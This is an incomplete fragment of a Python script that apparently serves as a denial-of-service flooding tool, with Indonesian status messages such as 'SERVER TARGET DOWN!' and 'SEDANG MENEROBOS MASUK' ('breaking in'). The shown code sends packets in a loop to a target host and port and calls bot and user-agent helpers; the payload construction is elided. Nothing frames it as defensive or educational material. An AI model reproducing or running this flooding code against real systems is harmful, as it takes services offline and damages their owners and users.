	...
	try:
		while True:
			...
			if s.sendto( packet, (host, int(port)) ):
				s.shutdown(1)
				print ("\033[92m",time.ctime(time.time()),"\033[0m \033[94m GOES MENYERANG TARGET!  \033[0m")
			else:
				s.shutdown(1)
				print("\033[91m TARGET MELEMAH! \033[0m")
			time.sleep(.1)
	except socket.error as e:
		print("\033[91m SERVER TARGET DOWN! \033[0m")
...
if __name__ == '__main__':
	...
	print("\033[94mSEDANG MENEROBOS MASUK...\033[0m")
	user_agent()
	my_bots()
	time.sleep(5)
	try:
